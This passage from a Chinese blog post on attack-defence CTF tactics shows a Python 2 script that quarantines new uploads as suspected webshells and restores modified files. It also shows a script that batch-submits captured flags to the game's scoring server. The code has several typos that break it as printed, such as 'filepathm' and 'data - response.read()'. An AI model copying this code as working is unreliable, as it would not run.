&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">	filelist = []</span><br><span class="line">	<span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">		<span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">			originalfile = os.path.join(root, filepath)</span><br><span class="line">			<span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">				filelist.append(originalfile)</span><br><span class="line">	<span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BA1;&#x7B97;&#x673A;&#x6587;&#x4EF6;MD5&#x503C;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">with</span> open(filepath,<span class="string">&apos;rb&apos;</span>) <span class="keyword">as</span> f:</span><br><span class="line">			md5obj = hashlib.md5()</span><br><span class="line">			md5obj.update(f.read())</span><br><span class="line">			hash = md5obj.hexdigest()</span><br><span class="line">			<span class="keyword">return</span> hash</span><br><span class="line">	<span class="keyword">except</span> Exception, e:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">u&apos;[!] getmd5_error : &apos;</span>+getUnicode(filepath)</span><br><span class="line">		<span class="keyword">print</span> getUnicode(e)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			ORIGIN_FILE_LIST.remove(fielpath)</span><br><span class="line">			FILE_MD5_DICT.pop(filepath,<span class="keyword">None</span>)</span><br><span class="line">		<span class="keyword">except</span> KeyError, e:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">	filemd5dict = {}</span><br><span class="line">	<span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">		<span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">			md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">			<span class="keyword">if</span> md5:</span><br><span class="line">				filemd5dict[ori_file] = md5</span><br><span class="line">	<span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line">	<span class="comment"># if len(os.listdir(Special_path[&apos;bak&apos;])) == 0;</span></span><br><span class="line">	<span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">		<span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">			shutil.copy2(filepathm Special_path[<span class="string">&apos;bak&apos;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">u&apos;-------------start---------------&apos;</span></span><br><span class="line">	<span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">		mkdir_p(Special_path[value])</span><br><span class="line">	<span class="comment"># &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7684;MD5&#xFF0C;&#x540C;&#x4E8B;&#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;</span></span><br><span class="line">	ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">	FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">	backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x91CD;&#x540D;BUG</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">u&apos;[*] pre work end!&apos;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		file_lsit = getfilelist(CWD)</span><br><span class="line">		<span class="comment"># &#x79FB;&#x9664;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;</span></span><br><span class="line">		diff_file_list = list(set(file_lsit) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">		<span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">			<span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">			<span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					f = open(filepath, <span class="string">&apos;r&apos;</span>).read()</span><br><span class="line">				<span class="keyword">except</span> Exception, e:</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">					<span class="keyword">try</span>:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">u&apos;[*] websehll find :&apos;</span> + getUnicode(filepath)</span><br><span class="line">						shutil.move(filepath,os.path.join(Special_path[<span class="string">&apos;webshell&apos;</span>],ntpath.basename(filepath) + <span class="string">&apos;.txt&apos;</span>))</span><br><span class="line">					<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;</span>%getUnicode(filepath)</span><br><span class="line">					<span class="keyword">try</span>:</span><br><span class="line">						f = open(os.path.join(Special_path[<span class="string">&apos;log&apos;</span>],<span class="string">&apos;log.txt&apos;</span>),<span class="string">&apos;a&apos;</span>)</span><br><span class="line">						f.write(<span class="string">&apos;newfile: &apos;</span> + getUnicode(filepath) = <span class="string">&apos; : &apos;</span> + str(time.ctime()) + <span class="string">&apos;\n&apos;</span>)</span><br><span class="line">						f.close()</span><br><span class="line">					<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">u&apos;[-] log error : file move error: &apos;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x9632;&#x6B62;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8FD8;&#x539F;&#x88AB;&#x4FEE;&#x6539;&#x6587;&#x4EF6;</span></span><br><span class="line">md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line"><span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">	<span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			f = open(filekey, <span class="string">&apos;r&apos;</span>).read()</span><br><span class="line">		<span class="keyword">except</span> Exception, e:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">u&apos;[*] file had be change : &apos;</span> + getUnicode(filekey)</span><br><span class="line">				shutil.move(filekey, os.path.join(Special_path[<span class="string">&apos;difffile&apos;</span>], ntpath.basename(filekey) + <span class="string">&apos;.txt&apos;</span>))</span><br><span class="line">				shutil.move(os.path.join(Special_path[<span class="string">&apos;bak&apos;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">u&apos;[!] move webshell error, &quot;%&quot; maybe is webshell.&apos;</span>%getUnicode(filekey)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				f = open(os.path.join(Special_path[<span class="string">&apos;log&apos;</span>],<span class="string">&apos;log.txt&apos;</span>),<span class="string">&apos;a&apos;</span>)</span><br><span class="line">				f.write(<span class="string">&apos;diff_file: &apos;</span> + getUnicode(filekey) + <span class="string">&apos; : &apos;</span> + getUnicode(time.ctime()) + <span class="string">&apos;\n&apos;</span>)</span><br><span class="line">				f.close()</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">u&apos;[-] log error : done_diff: &apos;</span> + getUnicode(filekey)</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#print `[*] &apos; + getUnicode(time.ctime())</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<h1 id="&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;"><a href="#&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;" class="headerlink" title="&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;"></a>&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;</h1><p>&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EA;&#x6709;&#x51E0;&#x5206;&#x949F;&#x4E00;&#x8F6E;&#xFF0C;&#x624B;&#x5DE5;&#x63D0;&#x4EA4;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;flag&#x663E;&#x7136;&#x4E0D;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x51C6;&#x5907;&#x6279;&#x91CF;&#x63D0;&#x4EA4;flag&#x7684;&#x811A;&#x672C;&#xFF1A;<br></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"></span><br><span class="line">server_host = <span class="string">&apos;10.10.0.2&apos;</span></span><br><span class="line">server_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&apos;team_token or flag not found&apos;</span>)</span><br><span class="line">	conn = httplib.HTTPConnection(host, port, timeout=timeout)</span><br><span class="line">	params = urllib.urlencode({</span><br><span class="line">		<span class="string">&apos;token&apos;</span>: team_token,</span><br><span class="line">		<span class="string">&apos;flag&apos;</span>: flag,</span><br><span class="line">		})</span><br><span class="line">	headers = {</span><br><span class="line">		<span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">	}</span><br><span class="line">	conn.request(<span class="string">&apos;POST&apos;</span>, <span class="string">&apos;/api/submit_flag&apos;</span>, params, headers)</span><br><span class="line">	response = conn.getresponse()</span><br><span class="line">	data - response.read()</span><br><span class="line">	<span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&apos;usage: ./submitflag.py $team_token $flag&apos;</span></span><br><span class="line">		sys.exit()</span><br><span class="line">	host = server_host</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">		host = sys.argv[<span class="number">3</span>]</span><br><span class="line">	<span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h1 id="&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;"><a href="#&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;" class="headerlink" title="&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;"></a>&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;</h1><p>&#x901A;&#x8FC7;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;&#x7684;&#x5206;&#x6790;&#xFF1A;</p>
+<ol>
+<li>&#x611F;&#x77E5;&#x53EF;&#x80FD;&#x6B63;&#x5728;&#x53D1;&#x751F;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x4ECE;&#x800C;&#x89C4;&#x907F;&#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x98CE;&#x9669;</li>
+<li>&#x5E94;&#x6025;&#x54CD;&#x5E94;&#xFF0C;&#x8FD8;&#x539F;&#x653B;&#x51FB;&#x8005;&#x7684;&#x653B;&#x51FB;&#x8DEF;&#x5F84;&#xFF0C;&#x4ECE;&#x800C;&#x633D;&#x56DE;&#x5DF2;&#x7ECF;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYly1fvyfmg5lngj30ya0efn9u.jpg" alt="analysis" title="">
+                </div>
+                <div class="image-caption">analysis</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fvyfmfhytnj30j807rwf9.jpg" alt="php-script" title="">
+                </div>
+                <div class="image-caption">php-script</div>
+            </figure>
+</li>
+</ol>
+<h1 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h1><p><a href="https://github.com/admintony/Prepare-for-AWD.git" target="_blank" rel="noopener">&#x811A;&#x672C;&#x6E90;&#x7801;&#x94FE;&#x63A5;</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-10-06T05:25:33.720Z" itemprop="dateUpdated">2018-10-06 13:25:33</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/28c30eb2/" target="_blank" rel="external">http://deops.cn/posts/28c30eb2/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='http://deops.cn'">
+            <img src="/img/avatar.gif" alt="Echo">
+            <a>Echo</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息安全/">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络空间安全/">网络空间安全</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Deops's.cn&pic=http://deops.cn/img/avatar.gif" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Deops's.cn&source=CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://deops.cn/posts/28c30eb2/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CTF线下赛AWD套路小结》 — Deops's.cn&url=http://deops.cn/posts/28c30eb2/&via=http://deops.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://deops.cn/posts/28c30eb2/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/9bf5b5/" id="post-prev" class="post-nav-link">
+        <h4 class="title">
+          上一篇：我学练英语所使用的方法、工具与资料
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/afdfa673/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：RHEL 7配置Yum软件仓库">下一篇：RHEL 7配置Yum软件仓库</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2019
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="http://deops.cn">deops.cn</a>
+            <br>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br>
+
+        <span>
+            
+
+        </span>
+        <br>
+
+        <span class="license">This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Deops's.cn&pic=http://deops.cn/img/avatar.gif" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Deops's.cn&source=CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://deops.cn/posts/28c30eb2/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CTF线下赛AWD套路小结》 — Deops's.cn&url=http://deops.cn/posts/28c30eb2/&via=http://deops.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://deops.cn/posts/28c30eb2/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABxUlEQVR42u3ay46DMAwF0P7/T3e2M6qaXtshZaSTFSoUDiwsP/J4xOv5a63Pvl7z+vv6bhsWLi7umPtcrh53TX93nNwBFxf3JPcdYn3r/Pr8/h9suLi4t+QmoWedvrwLlLi4uP+XW019kn/h4uLek5sUP+ugtg5bX6jVcHFxB9y8S3nd8SX9XVxc3Bb3WVzVZCUZrhSejouLe4SbB5R56pMXPB+Gu7i4uAe5E1A+WM1TqHKthouLu5VbuKjYzkher7eNAxcX9zpuknbkm7TyZmj+Cf6cxcXFPcLtpSmHWL3iBxcXd8xNyp75eLU6Lm2GMFxc3K3camM02j4VX1kYxuDi4h7hVscYkxHsZDSLi4t7B25euiRBqlr8lAMZLi7uBdwkYPUeVk5Tkg+Hi4t7kDvZgDVJgKqlES4u7re4vS1T1dfLG6y4uLjf5e7ajNXsxEyaILi4uJu4kwcnJU2vnVqIc7i4uBdwq+2JJLlJ0L2CChcX9yR3PjqdN1ILbVZcXNyD3MlIddt0NwlwuLi4t+cm4Sl/jag0wsXFvSV389C02EzBxcU9ya0GoIS+xiVoXFzcb3Grg8/e4/Nw1iuZcHFxN3F/AG574jHb0ePTAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0"></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0"></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2019/01/01");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Echo");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+
+</body>
+</html>
